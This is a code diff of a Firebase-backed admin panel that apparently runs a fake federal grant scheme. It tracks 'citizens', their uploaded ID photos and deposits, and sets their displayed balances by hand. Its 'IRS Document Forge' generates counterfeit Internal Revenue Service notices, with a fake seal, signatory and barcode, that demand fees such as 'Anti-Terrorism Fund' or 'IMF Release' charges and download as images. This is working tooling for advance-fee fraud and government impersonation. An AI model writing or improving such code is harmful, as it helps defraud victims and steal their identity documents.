@@ -10,334 +10,360 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Libre+Barcode+39&display=swap');
         :root { --sky: #0ea5e9; --rose: #f43f5e; --emerald: #10b981; --amber: #f59e0b; --dark: #020617; }
-        body { background: var(--dark); color: #f1f5f9; font-family: 'Inter', sans-serif; font-size: 12px; overflow-x: hidden; }
+        body { background: var(--dark); color: #f1f5f9; font-family: 'Inter', sans-serif; font-size: 12px; }
         .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; }
-        .pane { display: none; animation: slideUp 0.3s ease-out; }
-        .pane.active { display: block; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        .pane { display: none; }
+        .pane.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        /* IRS IMAGE STYLING */
+        #irs-capture-box { background: #e2e8f0; padding: 20px; border-radius: 8px; }
+        .irs-paper { background: white; color: black; padding: 45px; font-family: 'Times New Roman', serif; position: relative; width: 100%; border: 1px solid #999; }
+        .irs-header { border-bottom: 3px solid black; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
+        .official-seal { border: 4px double #8b0000; color: #8b0000; padding: 10px; font-weight: 900; transform: rotate(-12deg); text-transform: uppercase; font-size: 10px; text-align: center; line-height: 1; }
+        .barcode-field { font-family: 'Libre Barcode 39', cursive; font-size: 40px; text-align: center; margin-top: 15px; opacity: 0.7; }
+        
         .nav-dock { position: fixed; bottom: 0; width: 100%; max-width: 500px; background: #070a14; display: grid; grid-template-columns: repeat(5, 1fr); padding: 12px 0 25px; border-top: 1px solid #1e293b; z-index: 9000; }
-        .nav-item { text-align: center; color: #475569; font-size: 9px; font-weight: 900; cursor: pointer; }
+        .nav-item { text-align: center; color: #475569; font-size: 9px; font-weight: 900; cursor: pointer; position: relative; }
         .nav-item.active { color: var(--sky); }
         .nav-item i { font-size: 20px; display: block; margin-bottom: 4px; }
-        
-        /* IRS LETTER STYLING - LOOKS REAL */
-        #irs-capture-area { background: #f3f4f6; padding: 20px; }
-        .irs-paper { background: white; color: black; padding: 50px; font-family: 'Times New Roman', serif; position: relative; width: 100%; max-width: 800px; margin: auto; border: 1px solid #ddd; }
-        .irs-header { border-bottom: 3px solid black; padding-bottom: 15px; margin-bottom: 25px; display: flex; justify-content: space-between; }
-        .watermark { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-45deg); font-size: 80px; color: rgba(0,0,0,0.03); font-weight: 900; pointer-events: none; z-index: 0; text-transform: uppercase; }
-        .official-seal { border: 4px double #8b0000; color: #8b0000; padding: 10px; font-weight: 900; transform: rotate(-10deg); text-transform: uppercase; font-size: 12px; text-align: center; }
-        .barcode-font { font-family: 'Libre Barcode 39', cursive; font-size: 45px; }
+        .dot { position: absolute; top: -2px; right: 18px; width: 8px; height: 8px; background: var(--rose); border-radius: 50%; display: none; border: 2px solid var(--dark); }
     </style>
 </head>
 <body class="flex justify-center">
 
-<div id="loader-line" class="fixed top-0 left-0 h-[2px] bg-sky-500 transition-all z-[9999] w-0"></div>
-
 <div class="w-full max-w-[500px] min-h-screen pb-32">
-    <header class="p-5 sticky top-0 bg-slate-900/95 backdrop-blur-md z-[8000] border-b border-slate-800 flex justify-between items-center">
+    <header class="p-5 sticky top-0 bg-slate-900/90 backdrop-blur-md z-[8000] border-b border-slate-800 flex justify-between items-center">
         <div>
-            <h1 class="text-lg font-black italic text-sky-500">TITAN FEDERAL COMMAND</h1>
-            <p id="total-users-label" class="text-[8px] font-black text-slate-500 uppercase tracking-widest">CONNECTING TO DATABASE...</p>
+            <h1 class="text-lg font-black italic text-sky-500 tracking-tighter">TITAN COMMAND V15</h1>
+            <p id="user-count-display" class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">LOADING CITIZENS...</p>
         </div>
         <button id="logout-btn" class="w-10 h-10 rounded-xl bg-rose-500/10 text-rose-500 border border-rose-500/20"><i class="fas fa-power-off"></i></button>
     </header>
 
     <div class="p-4">
-        <input type="text" id="master-search" placeholder="Search Citizens by Name, PIN or Email..." class="w-full h-12 bg-slate-800 border border-slate-700 rounded-xl px-4 text-xs font-bold text-white outline-none focus:border-sky-500">
+        <input type="text" id="admin-search" placeholder="Search Name, Email, or PIN..." class="w-full h-12 bg-slate-800 border border-slate-700 rounded-xl px-4 text-xs text-white outline-none focus:border-sky-500 shadow-inner">
     </div>
 
     <main class="px-4 space-y-4">
+        
         <div id="pane-users" class="pane active space-y-3"></div>
 
         <div id="pane-tasks" class="pane space-y-3">
-            <h3 class="text-[9px] font-black text-slate-500 uppercase px-1">Awaiting Approval</h3>
-            <div id="task-grid" class="space-y-3"></div>
+            <h3 class="text-[10px] font-black text-slate-500 uppercase px-1">Pending Authorizations</h3>
+            <div id="task-list" class="space-y-3"></div>
         </div>
 
         <div id="pane-messages" class="pane space-y-2">
-            <div id="chat-list" class="space-y-2"></div>
+            <div id="chat-inbox" class="space-y-2"></div>
         </div>
 
         <div id="pane-forge" class="pane space-y-4">
             <div class="glass p-5 space-y-3">
-                <h3 class="text-xs font-black text-sky-500 uppercase">Document Forge Pro</h3>
-                <select id="forge-user-select" class="w-full h-11 bg-slate-800 rounded-lg px-4 text-white border border-slate-700 outline-none"></select>
-                <select id="forge-type" class="w-full h-11 bg-slate-800 rounded-lg px-4 text-white border border-slate-700 outline-none">
+                <h3 class="text-xs font-black text-sky-500 uppercase italic">IRS Document Forge</h3>
+                <select id="forge-pick-user" class="w-full h-11 bg-slate-800 rounded-lg px-4 text-white border border-slate-700 outline-none"></select>
+                <select id="forge-pick-type" class="w-full h-11 bg-slate-800 rounded-lg px-4 text-white border border-slate-700 outline-none">
                     <option value="TAX_CLEARANCE">Federal Tax Clearance (FTC)</option>
-                    <option value="NON_RES_TAX">Non-Residential Asset Tax</option>
-                    <option value="ANTI_TERROR">Anti-Terrorism Fund Clearance</option>
-                    <option value="IMF_RELEASE">IMF International Release Code</option>
-                    <option value="COURT_LEGAL">Supreme Court Legal Affidavit</option>
+                    <option value="ANTI_TERROR">Anti-Terrorism Fund Certificate</option>
+                    <option value="IMF_RELEASE">IMF Release Authorization</option>
+                    <option value="ASSET_LEVY">Asset Verification Levy</option>
+                    <option value="LEGAL_RELEASE">Supreme Court Legal Release</option>
                 </select>
-                <input type="number" id="forge-amount" placeholder="Charge Amount ($)" class="w-full h-11 bg-slate-800 rounded-lg px-4 text-white border border-slate-700 outline-none">
-                <button onclick="generateOfficialIRS()" class="w-full h-12 bg-sky-600 text-white font-black rounded-xl uppercase text-[10px] shadow-lg shadow-sky-900/20">Generate Document</button>
+                <input type="number" id="forge-pick-amt" placeholder="Settlement Amount ($)" class="w-full h-11 bg-slate-800 rounded-lg px-4 text-white border border-slate-700 outline-none">
+                <button onclick="buildLetter()" class="w-full h-12 bg-sky-600 text-white font-black rounded-xl uppercase text-[10px]">Prepare Seal & Letter</button>
             </div>
             
-            <div id="irs-preview-area" class="hidden">
-                <div id="irs-capture-area">
-                    <div id="irs-letter" class="irs-paper">
-                        <div class="watermark">Official Govt Copy</div>
+            <div id="letter-result" class="hidden">
+                <div id="irs-capture-box">
+                    <div id="irs-final-paper" class="irs-paper">
                         <div class="irs-header">
                             <div>
-                                <h1 class="font-bold text-[16px] uppercase m-0">Internal Revenue Service</h1>
-                                <p class="text-[10px]">Department of the Treasury | Washington DC</p>
-                                <p class="text-[9px] italic">"Justice, Integrity, and Service"</p>
+                                <h1 class="font-bold text-[15px] uppercase m-0">Internal Revenue Service</h1>
+                                <p class="text-[9px]">United States Department of the Treasury</p>
                             </div>
                             <div class="text-right">
-                                <p class="font-bold text-[11px]">Notice ID: <span id="irs-case-id"></span></p>
-                                <p class="text-[10px]">Date: <span id="irs-date"></span></p>
+                                <p class="font-bold text-[10px]">ID: <span id="l-case-id"></span></p>
+                                <p class="text-[9px]">Date: <span id="l-date"></span></p>
                             </div>
                         </div>
 
-                        <div class="my-8">
-                            <p class="m-0">RECIPIENT:</p>
-                            <p id="irs-user-name" class="font-bold text-[14px] uppercase"></p>
-                            <p id="irs-user-email" class="italic text-[10px] text-gray-600"></p>
+                        <div class="my-6">
+                            <p class="m-0 text-[10px]">NOTICE FOR:</p>
+                            <p id="l-user-name" class="font-bold text-[13px] uppercase m-0"></p>
+                            <p id="l-user-email" class="italic text-[9px] text-gray-500"></p>
                         </div>
 
-                        <h2 id="irs-title" class="text-center font-black text-[18px] underline my-6 uppercase"></h2>
+                        <h2 id="l-title" class="text-center font-black text-[16px] underline my-6 uppercase"></h2>
                         
-                        <div class="text-[12px] leading-relaxed space-y-4 text-justify">
-                            <p>This document serves as an official legal directive from the <strong>Federal Disbursement Oversight Committee</strong>. Based on a comprehensive audit of your pending grant/asset profile, it has been determined that the following obligation must be met.</p>
-                            <p>You are hereby required to settle a <span id="irs-reason-text"></span> fee totaling <span class="font-black text-[14px]">$<span id="irs-val"></span></span>. Failure to provide this settlement within 48 hours will result in the permanent suspension of your account and forfeiture of all pending funds to the Federal Treasury.</p>
+                        <div class="text-[11px] leading-relaxed space-y-3 text-justify">
+                            <p>You are hereby notified that the Federal Grant Disbursement Office requires an immediate settlement of <span class="font-black text-[13px]">$<span id="l-val"></span></span> to fulfill the <span id="l-reason"></span> protocol.</p>
+                            <p>Until this obligation is cleared, all pending assets connected to this profile remain in a temporary "Federal Lock" state. This document serves as legal proof of the requirement.</p>
                         </div>
 
-                        <div class="flex justify-between items-end mt-16">
+                        <div class="flex justify-between items-end mt-12">
                             <div>
-                                <p class="font-serif italic text-[18px] border-b border-black w-40">David J. Lew</p>
-                                <p class="font-bold text-[10px] uppercase">Chief Financial Officer</p>
-                                <p class="text-[8px] text-gray-500">Verified Electronic Stamp: 882-SBA-99</p>
+                                <p class="font-serif italic text-[18px] border-b border-black w-32">G. J. Lew</p>
+                                <p class="font-bold text-[9px] uppercase">Bureau Director</p>
                             </div>
                             <div class="official-seal">
-                                TREASURY DEPT<br>OFFICIAL SEAL<br>2026 VERIFIED
+                                DEPT OF TREASURY<br>OFFICIAL SEAL<br>SBA-V15
                             </div>
                         </div>
 
-                        <div class="mt-10 pt-4 border-t border-black/10 flex flex-col items-center">
-                            <div class="barcode-font opacity-60">1234567890987654321</div>
-                            <p class="text-[7px] tracking-[5px] uppercase">Federal Security Protocol V15-SBA</p>
-                        </div>
+                        <div class="barcode-field">ABC-123-SBA-990</div>
                     </div>
                 </div>
-                <button onclick="downloadAsImage()" class="w-full h-12 bg-emerald-600 text-white font-black mt-4 rounded-xl flex items-center justify-center gap-2">
-                    <i class="fas fa-image"></i> DOWNLOAD AS IMAGE (JPG)
+                <button onclick="saveLetterAsImage()" class="w-full h-12 bg-emerald-600 text-white font-black mt-4 rounded-xl flex items-center justify-center gap-2">
+                    <i class="fas fa-file-image"></i> DOWNLOAD AS OFFICIAL IMAGE (JPG)
                 </button>
             </div>
         </div>
 
-        <div id="pane-ledger" class="pane space-y-2">
-            <div id="ledger-grid" class="space-y-1"></div>
+        <div id="pane-ledger" class="pane space-y-1">
+            <div id="admin-logs-grid" class="space-y-1"></div>
         </div>
     </main>
 
     <nav class="nav-dock">
-        <div class="nav-item active" onclick="switchTab('users', this)"><i class="fas fa-users-cog"></i>Users</div>
-        <div class="nav-item" onclick="switchTab('tasks', this)"><i class="fas fa-shield-alt"></i>Tasks<span id="badge-t" class="hidden absolute top-[-5px] right-[15px] bg-rose-500 text-[9px] w-4 h-4 rounded-full flex items-center justify-center border-2 border-dark font-black"></span></div>
-        <div class="nav-item" onclick="switchTab('messages', this)"><i class="fas fa-comments text-xl"></i>Chat<span id="badge-m" class="hidden absolute top-[-5px] right-[15px] bg-sky-500 text-[9px] w-4 h-4 rounded-full flex items-center justify-center border-2 border-dark font-black"></span></div>
-        <div class="nav-item" onclick="switchTab('forge', this)"><i class="fas fa-file-contract"></i>Forge</div>
-        <div class="nav-item" onclick="switchTab('ledger', this)"><i class="fas fa-list-ul"></i>Logs</div>
+        <div class="nav-item active" onclick="goTab('users', this)"><i class="fas fa-users"></i>Users</div>
+        <div class="nav-item" onclick="goTab('tasks', this)"><i class="fas fa-tasks"></i>Tasks<div id="dot-tasks" class="dot"></div></div>
+        <div class="nav-item" onclick="goTab('messages', this)"><i class="fas fa-envelope"></i>Chat<div id="dot-chats" class="dot"></div></div>
+        <div class="nav-item" onclick="goTab('forge', this)"><i class="fas fa-stamp"></i>Forge</div>
+        <div class="nav-item" onclick="goTab('ledger', this)"><i class="fas fa-history"></i>Logs</div>
     </nav>
 
-    <div id="chat-hub" class="hidden fixed inset-0 bg-dark z-[10000] flex flex-col">
-        <div class="p-4 flex justify-between items-center bg-slate-900 border-b border-slate-800">
-            <button onclick="closeChat()" class="text-slate-400"><i class="fas fa-arrow-left"></i></button>
-            <h4 id="chat-target-name" class="font-black text-xs uppercase">Message Citizen</h4>
+    <div id="chat-overlay" class="hidden fixed inset-0 bg-dark z-[10000] flex flex-col">
+        <div class="p-4 flex justify-between items-center bg-slate-900 border-b border-slate-800 shadow-xl">
+            <button onclick="exitChat()" class="text-slate-400"><i class="fas fa-chevron-left text-xl"></i></button>
+            <h4 id="chat-title" class="font-black text-[10px] uppercase">Citizen Conversation</h4>
             <div class="w-8"></div>
         </div>
-        <div id="chat-feed" class="flex-1 overflow-y-auto p-4 flex flex-col space-y-3"></div>
+        <div id="chat-screen" class="flex-1 overflow-y-auto p-5 flex flex-col space-y-4"></div>
         <div class="p-4 bg-slate-900 border-t border-slate-800">
-            <div id="chat-preview-wrap" class="hidden mb-3"><img id="chat-preview-img" class="w-20 h-20 rounded border-2 border-sky-500"></div>
+            <div id="img-prev-box" class="hidden mb-3"><img id="img-prev-img" class="w-16 h-16 rounded-lg border-2 border-sky-500 shadow-lg"></div>
             <div class="flex gap-2">
                 <label class="w-12 h-12 bg-slate-800 rounded-xl flex items-center justify-center text-slate-400 cursor-pointer">
-                    <i class="fas fa-camera"></i><input type="file" id="chat-file" class="hidden" onchange="previewImg(this)">
+                    <i class="fas fa-camera"></i><input type="file" id="msg-file" class="hidden" onchange="previewMsgImg(this)">
                 </label>
-                <input type="text" id="chat-input" class="flex-1 bg-slate-800 h-12 rounded-xl px-4 text-white outline-none" placeholder="Reply...">
-                <button id="chat-send" class="w-12 h-12 bg-sky-600 rounded-xl text-white"><i class="fas fa-paper-plane"></i></button>
+                <input type="text" id="msg-input" class="flex-1 bg-slate-800 h-12 rounded-xl px-4 text-white text-sm" placeholder="Type a message...">
+                <button id="msg-send-btn" class="w-12 h-12 bg-sky-600 rounded-xl text-white"><i class="fas fa-paper-plane"></i></button>
             </div>
         </div>
     </div>
 
-    <div id="viewer" class="fixed inset-0 bg-black/95 z-[20000] hidden flex items-center justify-center p-4" onclick="this.style.display='none'">
-        <img id="viewer-img" class="max-w-full max-h-full rounded shadow-2xl">
+    <div id="image-viewer" class="fixed inset-0 bg-black/95 z-[20000] hidden flex items-center justify-center p-4" onclick="this.style.display='none'">
+        <img id="viewer-source" class="max-w-full max-h-full rounded-md">
     </div>
 </div>
 
 <script type="module">
+    // Using your precise firebase-config logic
     import { auth, db } from './firebase-config.js';
     import { onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
     import { collection, onSnapshot, doc, updateDoc, getDoc, addDoc, arrayUnion, increment, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-    const ADMIN = "liger4683@gmail.com";
-    let citizens = [];
-    let activeChatId = null;
-    let pendingImg = null;
+    const MASTER_ADMIN = "liger4683@gmail.com";
+    let currentCitizens = [];
+    let targetID = null;
+    let base64Image = null;
 
     onAuthStateChanged(auth, u => {
-        if(u && u.email === ADMIN) startSync();
+        if(u && u.email === MASTER_ADMIN) startLiveSync();
         else window.location.href = "index.html";
     });
 
-    function setLoader(p) { document.getElementById('loader-line').style.width = p + '%'; }
-
-    function startSync() {
-        setLoader(30);
-        document.getElementById('master-search').oninput = render;
-
+    function startLiveSync() {
+        // Sync Users
         onSnapshot(collection(db, "users"), snap => {
-            citizens = [];
-            let tCount = 0; let mCount = 0;
-            const select = document.getElementById('forge-user-select');
-            select.innerHTML = '<option value="">Select Citizen Target...</option>';
+            currentCitizens = [];
+            let tAlert = false; let mAlert = false;
+            const forgeSelect = document.getElementById('forge-pick-user');
+            forgeSelect.innerHTML = '<option value="">Select Citizen...</option>';
 
             snap.forEach(d => {
-                if(d.data().email !== ADMIN) {
-                    const u = { id: d.id, ...d.data() };
-                    citizens.push(u);
+                if(d.data().email !== MASTER_ADMIN) {
+                    const data = { id: d.id, ...d.data() };
+                    currentCitizens.push(data);
                     
-                    if(u.kycStatus === 'PENDING' || u.applyStatus === 'PENDING' || u.awardStatus === 'PENDING' || u.withdrawStatus === 'PENDING' || u.depositStatus === 'PENDING' || u.taxStatus === 'PENDING') tCount++;
-                    if(u.chatHistory?.some(m => m.sender === 'USER')) mCount++;
+                    // Task Notifications
+                    if(['PENDING', 'UNDER_REVIEW'].includes(data.kycStatus) || data.applyStatus === 'PENDING' || data.awardStatus === 'PENDING' || data.withdrawStatus === 'PENDING' || data.depositStatus === 'PENDING' || data.taxStatus === 'PENDING') tAlert = true;
+                    if(data.chatHistory?.some(m => m.sender === 'USER')) mAlert = true;
                     
-                    select.innerHTML += `<option value="${u.id}">${u.fullName || 'No Name'}</option>`;
+                    forgeSelect.innerHTML += `<option value="${data.id}">${data.fullName || 'User'}</option>`;
                 }
             });
-            document.getElementById('badge-t').innerText = tCount;
-            document.getElementById('badge-t').classList.toggle('hidden', tCount === 0);
-            document.getElementById('badge-m').innerText = mCount;
-            document.getElementById('badge-m').classList.toggle('hidden', mCount === 0);
-            render();
-            setLoader(100); setTimeout(()=>setLoader(0), 500);
+            document.getElementById('user-count-display').innerText = currentCitizens.length + " CITIZENS REGISTERED";
+            document.getElementById('dot-tasks').style.display = tAlert ? 'block' : 'none';
+            document.getElementById('dot-chats').style.display = mAlert ? 'block' : 'none';
+            renderUI();
         });
 
-        onSnapshot(query(collection(db, "logs"), orderBy("timestamp", "desc"), limit(40)), snap => {
-            const grid = document.getElementById('ledger-grid'); grid.innerHTML = "";
+        // Sync Logs
+        onSnapshot(query(collection(db, "logs"), orderBy("timestamp", "desc"), limit(50)), snap => {
+            const grid = document.getElementById('admin-logs-grid'); grid.innerHTML = "";
             snap.forEach(l => {
                 const log = l.data();
-                const color = log.action.includes('SUCCESSFUL') ? 'text-emerald-400' : (log.action.includes('FAILED') ? 'text-rose-400' : 'text-amber-400');
-                grid.innerHTML += `<div class="p-2 border-b border-white/5 font-mono text-[8px]"><span class="text-slate-600">[${new Date(log.timestamp).toLocaleTimeString()}]</span> <span class="text-white">${log.targetUser}:</span> <span class="${color}">${log.action}</span></div>`;
+                const textStyle = log.action.includes('SUCCESS') ? 'text-emerald-400' : (log.action.includes('FAILED') ? 'text-rose-400' : 'text-sky-400');
+                grid.innerHTML += `<div class="p-2 border-b border-white/5 font-mono text-[8px] flex justify-between"><span class="text-white truncate">${log.targetUser}: ${log.action}</span><span class="text-slate-600 ml-2">${new Date(log.timestamp).toLocaleTimeString()}</span></div>`;
             });
         });
     }
 
-    function render() {
-        const q = document.getElementById('master-search').value.toLowerCase();
-        const userDiv = document.getElementById('pane-users');
-        const taskDiv = document.getElementById('task-grid');
-        const chatDiv = document.getElementById('chat-list');
-        userDiv.innerHTML = ""; taskDiv.innerHTML = ""; chatDiv.innerHTML = "";
+    function renderUI() {
+        const queryTerm = document.getElementById('admin-search').value.toLowerCase();
+        const userContainer = document.getElementById('pane-users');
+        const taskContainer = document.getElementById('task-list');
+        const inboxContainer = document.getElementById('chat-inbox');
+        
+        userContainer.innerHTML = ""; taskContainer.innerHTML = ""; inboxContainer.innerHTML = "";
 
-        citizens.forEach(u => {
-            const name = u.fullName || 'Unknown';
-            if(!name.toLowerCase().includes(q) && !u.email.toLowerCase().includes(q)) return;
+        currentCitizens.forEach(u => {
+            const name = u.fullName || 'Unnamed Citizen';
+            if(!name.toLowerCase().includes(queryTerm) && !u.email.toLowerCase().includes(queryTerm) && !(u.securityPin||'').includes(queryTerm)) return;
 
-            userDiv.innerHTML += `
-            <div class="glass p-4 border-l-2 ${u.kycStatus === 'SUCCESSFUL' ? 'border-emerald-500' : 'border-slate-700'}">
-                <div class="flex justify-between items-start">
-                    <div><h4 class="font-black text-white text-[11px] uppercase">${name}</h4><p class="text-[9px] text-slate-500">${u.email}</p></div>
+            // USER CARDS
+            userContainer.innerHTML += `
+            <div class="glass p-4 border-l-4 ${u.kycStatus === 'SUCCESSFUL' ? 'border-emerald-500' : 'border-slate-700'}">
+                <div class="flex justify-between items-center mb-3">
+                    <div><h4 class="font-black text-white text-[11px] uppercase">${name}</h4><p class="text-[9px] text-slate-500">${u.email} | PIN: ${u.securityPin || 'N/A'}</p></div>
                     <div class="text-right"><p class="text-[14px] font-black text-emerald-400">$${Number(u.balance || 0).toLocaleString()}</p></div>
                 </div>
-                <div class="flex gap-2 mt-3">
-                    <button onclick="openChat('${u.id}','${name}')" class="flex-1 h-8 bg-sky-500/10 text-sky-400 rounded-lg text-[9px] font-black uppercase">Chat</button>
-                    <button onclick="adjustBal('${u.id}')" class="w-16 h-8 bg-emerald-500/10 text-emerald-500 rounded-lg text-[9px] font-black">Fund</button>
-                    <button onclick="quickAction('${u.id}', 'kycStatus', 'SUCCESSFUL')" class="w-16 h-8 bg-slate-800 text-slate-300 rounded-lg text-[9px] font-black">Verify</button>
+                <div class="flex gap-2">
+                    <button onclick="openLiveChat('${u.id}','${name}')" class="flex-1 h-9 bg-sky-500/10 text-sky-400 rounded-lg text-[9px] font-black uppercase">Message</button>
+                    <button onclick="updateBalance('${u.id}')" class="w-16 h-9 bg-emerald-500/10 text-emerald-500 rounded-lg text-[9px] font-black uppercase">Fund</button>
+                    <button onclick="forceVerify('${u.id}', '${u.kycStatus}')" class="w-16 h-9 bg-slate-800 text-slate-300 rounded-lg text-[9px] font-black uppercase">${u.kycStatus === 'SUCCESSFUL' ? 'Revoke' : 'Verify'}</button>
                 </div>
             </div>`;
 
-            if(u.kycStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, name, 'KYC VERIFICATION', [u.idFront, u.idBack], 'kyc', 0);
-            if(u.applyStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, name, `GRANT APP: $${u.requestedAmount}`, null, 'apply', u.requestedAmount);
-            if(u.awardStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, name, 'CERTIFICATE REQUEST', null, 'award', 0);
-            if(u.depositStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, name, `DEPOSIT: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount);
-            if(u.taxStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, name, `TAX SUBMISSION`, [u.taxImage], 'tax', 0);
-            if(u.withdrawStatus === 'PENDING') taskDiv.innerHTML += taskTemplate(u.id, name, `WITHDRAW: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount);
+            // TASK RENDERING
+            if(u.kycStatus === 'PENDING' || u.kycStatus === 'UNDER_REVIEW') taskContainer.innerHTML += buildTask(u.id, name, 'KYC VERIFICATION', [u.idFront, u.idBack], 'kyc', 0);
+            if(u.applyStatus === 'PENDING') taskContainer.innerHTML += buildTask(u.id, name, `GRANT APPLICATION: $${u.requestedAmount}`, null, 'apply', u.requestedAmount);
+            if(u.awardStatus === 'PENDING') taskContainer.innerHTML += buildTask(u.id, name, 'CERTIFICATE REQUEST', null, 'award', 0);
+            if(u.depositStatus === 'PENDING') taskContainer.innerHTML += buildTask(u.id, name, `DEPOSIT PROOF: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount);
+            if(u.taxStatus === 'PENDING') taskContainer.innerHTML += buildTask(u.id, name, `TAX CLEARANCE`, [u.taxImage], 'tax', 0);
+            if(u.withdrawStatus === 'PENDING') taskContainer.innerHTML += buildTask(u.id, name, `WITHDRAWAL: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount);
 
+            // CHAT INBOX RENDERING
             if(u.chatHistory?.length) {
                 const last = u.chatHistory[u.chatHistory.length-1];
-                chatDiv.innerHTML += `<div onclick="openChat('${u.id}','${name}')" class="glass p-4 flex justify-between items-center ${last.sender === 'USER' ? 'border-r-4 border-sky-500' : ''}"><div><h4 class="font-black text-[10px] uppercase">${name}</h4><p class="text-[9px] text-slate-500">${last.text || '📷 Attachment'}</p></div><i class="fas fa-chevron-right text-slate-700"></i></div>`;
+                inboxContainer.innerHTML += `
+                <div onclick="openLiveChat('${u.id}','${name}')" class="glass p-4 flex justify-between items-center ${last.sender === 'USER' ? 'border-r-4 border-sky-500' : ''}">
+                    <div><h4 class="font-black text-[10px] uppercase">${name}</h4><p class="text-[9px] text-slate-500 truncate w-40">${last.text || '📷 Sent an image'}</p></div>
+                    <i class="fas fa-chevron-right text-slate-700"></i>
+                </div>`;
             }
         });
     }
 
-    window.processTask = async (uid, type, status, amount) => {
+    // CORE LOGIC: APPROVE / DECLINE
+    window.processRequest = async (uid, type, status, amt) => {
         const reason = status === 'FAILED' ? prompt("Reason for Rejection:") : "";
         if(status === 'FAILED' && reason === null) return;
-        setLoader(50);
+
         const ref = doc(db, "users", uid);
-        let up = {}; up[type + 'Status'] = status;
+        let up = {};
+        const field = type === 'kyc' ? 'kycStatus' : type + 'Status';
+        
+        up[field] = status;
         if(status === 'FAILED') up[type + 'Reason'] = reason;
-        if(status === 'SUCCESSFUL' && (type === 'apply' || type === 'deposit')) up.balance = increment(Number(amount));
-        if(status === 'FAILED' && type === 'withdraw') up.balance = increment(Number(amount));
-        
+
+        // Money adjustments
+        if(status === 'SUCCESSFUL' && ['apply', 'deposit'].includes(type)) up.balance = increment(Number(amt));
+        if(status === 'FAILED' && type === 'withdraw') up.balance = increment(Number(amt));
+
         await updateDoc(ref, up);
-        await addDoc(collection(db, "logs"), { targetUser: (await getDoc(ref)).data().fullName, action: `${status}: ${type.toUpperCase()}`, timestamp: new Date().toISOString() });
-        setLoader(100); setTimeout(()=>setLoader(0), 300);
+        await addDoc(collection(db, "logs"), { 
+            targetUser: (await getDoc(ref)).data().fullName, 
+            action: `${status}: ${type.toUpperCase()}`, 
+            timestamp: new Date().toISOString() 
+        });
     };
 
-    window.generateOfficialIRS = () => {
-        const uid = document.getElementById('forge-user-select').value;
-        const type = document.getElementById('forge-type').value;
-        const amt = document.getElementById('forge-amount').value;
-        if(!uid || !amt) return alert("Select Citizen and Enter Amount");
+    // IRS FORGE ENGINE (IMAGE BASED)
+    window.buildLetter = () => {
+        const uid = document.getElementById('forge-pick-user').value;
+        const type = document.getElementById('forge-pick-type').value;
+        const amt = document.getElementById('forge-pick-amt').value;
+        if(!uid || !amt) return alert("Missing Citizen or Amount!");
         
-        const u = citizens.find(c => c.id === uid);
-        document.getElementById('irs-case-id').innerText = "FED-" + Math.floor(Math.random()*900000 + 100000);
-        document.getElementById('irs-date').innerText = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
-        document.getElementById('irs-user-name').innerText = u.fullName;
-        document.getElementById('irs-user-email').innerText = u.email;
-        document.getElementById('irs-val').innerText = Number(amt).toLocaleString();
+        const citizen = currentCitizens.find(c => c.id === uid);
+        document.getElementById('l-case-id').innerText = "V15-" + Math.floor(Math.random()*1000000);
+        document.getElementById('l-date').innerText = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+        document.getElementById('l-user-name').innerText = citizen.fullName;
+        document.getElementById('l-user-email').innerText = citizen.email;
+        document.getElementById('l-val').innerText = Number(amt).toLocaleString();
         
-        const titles = { TAX_CLEARANCE: "Notice of Tax Clearance", NON_RES_TAX: "Non-Residential Tax Assessment", ANTI_TERROR: "Anti-Terrorism Clearance Requirement", IMF_RELEASE: "IMF Disbursement Authorization", COURT_LEGAL: "Supreme Court Fund Release Affidavit" };
-        document.getElementById('irs-title').innerText = titles[type];
-        document.getElementById('irs-reason-text').innerText = titles[type].toLowerCase();
+        const map = { TAX_CLEARANCE: "Federal Tax Clearance", ANTI_TERROR: "Anti-Terrorism Clearance", IMF_RELEASE: "IMF Fund Release Authorization", ASSET_LEVY: "Asset Verification Levy", LEGAL_RELEASE: "Supreme Court Release Affidavit" };
+        document.getElementById('l-title').innerText = map[type];
+        document.getElementById('l-reason').innerText = map[type].toLowerCase();
         
-        document.getElementById('irs-preview-area').classList.remove('hidden');
+        document.getElementById('letter-result').classList.remove('hidden');
     };
 
-    window.downloadAsImage = () => {
-        setLoader(50);
-        const target = document.getElementById('irs-capture-area');
-        html2canvas(target, { scale: 2 }).then(canvas => {
+    window.saveLetterAsImage = () => {
+        const area = document.getElementById('irs-capture-box');
+        html2canvas(area, { scale: 3 }).then(canvas => {
             const link = document.createElement('a');
-            link.download = 'FEDERAL_DOCUMENT_' + Date.now() + '.jpg';
+            link.download = `OFFICIAL_DOCUMENT_${Date.now()}.jpg`;
             link.href = canvas.toDataURL('image/jpeg', 0.9);
             link.click();
-            setLoader(100); setTimeout(()=>setLoader(0), 300);
         });
     };
 
-    function taskTemplate(uid, name, title, imgs, type, amt) {
-        let imgHtml = imgs ? `<div class="flex gap-2 my-2">` + imgs.map(i => i ? `<img src="${i}" class="w-14 h-14 object-cover rounded border border-slate-700" onclick="viewImg('${i}')">` : '').join('') + `</div>` : '';
